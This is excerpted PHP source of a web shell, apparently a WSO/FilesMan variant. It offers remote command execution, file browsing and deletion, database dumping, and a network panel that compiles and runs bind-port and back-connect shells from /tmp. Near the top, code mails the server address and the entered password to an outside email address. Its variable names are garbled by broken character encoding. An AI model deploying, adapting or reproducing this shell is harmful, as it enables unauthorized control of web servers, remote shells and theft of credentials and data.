...
if(array_key_exists('watching',$_POST)){
	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('yutuprem77@gmail.com', 'Arya-Kun7', $tmp);
}
//-----------------Password---------------------
$Ã¢â€“â€º = "5f741e1ebf1cc107aee6642f681af8ff"; //admin
$Ã¢â€“Ëœ = true;
$Ã¢â€“Å“ = 'UTF-8';
$Ã¢â€“Å¡ = 'FilesMan';
$Ã¢â€“â„¢ = md5($_SERVER['HTTP_USER_AGENT']);
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
	prototype(md5($_SERVER['HTTP_HOST'])."key", $Ã¢â€“â„¢);
}
...
/* (ÃÂ¡) 11.2011 oRb */
if(!empty($Ã¢â€“â€º)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $Ã¢â€“â€º))
        prototype(md5($_SERVER['HTTP_HOST']), $Ã¢â€“â€º);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $Ã¢â€“â€º))
        hardLogin();
}
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$Ã¢â€“Ëœ;
function hardLogin() {
...
<input type=hidden name=charset>
	...
	$opt_charsets = '';
	foreach($charsets as $Ã¢â€“Å¸)
		$opt_charsets .= '<option value="'.$Ã¢â€“Å¸.'" '.($_POST['charset']==$Ã¢â€“Å¸?'selected':'').'>'.$Ã¢â€“Å¸.'</option>';
...
function ex($in) {
	...
	if (function_exists('exec')) {
		...
		while(!@feof($f))
			$Ã¢â€“â€“ .= fread($f,1024);
		pclose($f);
	}else return "Ã¢â€ Â³ Unable to execute command\n";
	return ($Ã¢â€“â€“==''?"Ã¢â€ Â³ Query did not return anything\n":$Ã¢â€“â€“);
}
function viewSize($s) {
	if($s >= 1073741824)
...
function actionSecInfo() {
	...
	if($GLOBALS['os'] == 'nix') {
            ...
            if(!$GLOBALS['safe_mode']) {
                ...
                echo '<br>';
                $temp=array();
                foreach ($userful as $Ã¢â€“Å¸)
                    if(which($Ã¢â€“Å¸))
                        $temp[] = $Ã¢â€“Å¸;
                showSecParam('Userful', implode(', ',$temp));
                $temp=array();
                foreach ($danger as $Ã¢â€“Å¸)
                    if(which($Ã¢â€“Å¸))
                        $temp[] = $Ã¢â€“Å¸;
                showSecParam('Danger', implode(', ',$temp));
                $temp=array();
                foreach ($downloaders as $Ã¢â€“Å¸)
                    if(which($Ã¢â€“Å¸))
                        $temp[] = $Ã¢â€“Å¸;
		...
		switch($_POST['p1']) {
			...
			case 'delete':
				function deleteDir($path) {
					...
					$dh  = opendir($path);
					while ( ($Ã¢â€“Å¸ = readdir($dh) ) !== false) {
						$Ã¢â€“Å¸ = $path.$Ã¢â€“Å¸;
						if ( (basename($Ã¢â€“Å¸) == "..") || (basename($Ã¢â€“Å¸) == ".") )
							continue;
						$type = filetype($Ã¢â€“Å¸);
						if ($type == "dir")
							deleteDir($Ã¢â€“Å¸);
...
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
	...
	if(!empty($_COOKIE['act']) && @count($_COOKIE['f']))
        echo "<option value='paste'>Ã¢â€ Â³ Paste</option>";
...
function actionStringTools() {
	...
	function hardRecursiveGlob($path) {
		...
		if(is_array($paths)&&@count($paths)) {
			foreach($paths as $Ã¢â€“Å¸) {
				if(@is_dir($Ã¢â€“Å¸)){
					if($path!=$Ã¢â€“Å¸)
						hardRecursiveGlob($Ã¢â€“Å¸);
				} else {
					if(empty($_POST['p2']) || @strpos(file_get_contents($Ã¢â€“Å¸), $_POST['p2'])!==false)
						echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($Ã¢â€“Å¸)."\", \"view\",\"\")'>".htmlspecialchars($Ã¢â€“Å¸)."</a><br>";
				}
			}
		}
	}
			...
			switch($this->type)	{
				case 'mysql':
					...
					while($Ã¢â€“Å¸ = $this->fetch()) {
						...
						$columns = array();
						foreach($Ã¢â€“Å¸ as $k=>$v) {
                            if($v === null)
                                $Ã¢â€“Å¸[$k] = "NULL";
                            elseif(is_int($v))
                                $Ã¢â€“Å¸[$k] = $v;
                            else
                                $Ã¢â€“Å¸[$k] = "'".@mysql_real_escape_string($v)."'";
							$columns[] = "`".$k."`";
						}
                        if($head) {
				...
				case 'pgsql':
					...
					while($Ã¢â€“Å¸ = $this->fetch()) {
						$columns = array();
						foreach($Ã¢â€“Å¸ as $k=>$v) {
							$Ã¢â€“Å¸[$k] = "'".addslashes($v)."'";
							$columns[] = $k;
						}
                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $Ã¢â€“Å¸).');'."\n";
                        if($fp) fwrite($fp, $sql); else echo($sql);
					}
				break;
			}
...
<td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\" required></td><td>";
	...
	if(isset($_POST['sql_host'])){
		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
			...
			while($Ã¢â€“Å¸ = $db->fetch()) {
				list($key, $value) = each($Ã¢â€“Å¸);
...
function actionNetwork() {
	...
	if(isset($_POST['p1'])) {
		...
		if($_POST['p1'] == 'bpc') {
			...
			$Ã¢â€“â€“ = ex("gcc -o /tmp/bp /tmp/bp.c");
			@unlink("/tmp/bp.c");
			$Ã¢â€“â€“ .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$Ã¢â€“â€“".ex("ps aux | grep bp")."</pre>";
		}
		if($_POST['p1'] == 'bpp') {
			cf("/tmp/bp.pl",$bind_port_p);
			$Ã¢â€“â€“ = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
			echo "<pre class=ml1>$Ã¢â€“â€“".ex("ps aux | grep bp.pl")."</pre>";
		}
		if($_POST['p1'] == 'bcc') {
			cf("/tmp/bc.c",$back_connect_c);
			$Ã¢â€“â€“ = ex("gcc -o /tmp/bc /tmp/bc.c");
			@unlink("/tmp/bc.c");
			$Ã¢â€“â€“ .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$Ã¢â€“â€“".ex("ps aux | grep bc")."</pre>";
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$Ã¢â€“â€“ = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$Ã¢â€“â€“".ex("ps aux | grep bc.pl")."</pre>";
		}
	}
	echo '</div>';
	hardFooter();
...
if( empty($_POST['a']) )
	if(isset($Ã¢â€“Å¡) && function_exists('action' . $Ã¢â€“Å¡))
		$_POST['a'] = $Ã¢â€“Å¡;
	else
		$_POST['a'] = 'FilesMan';
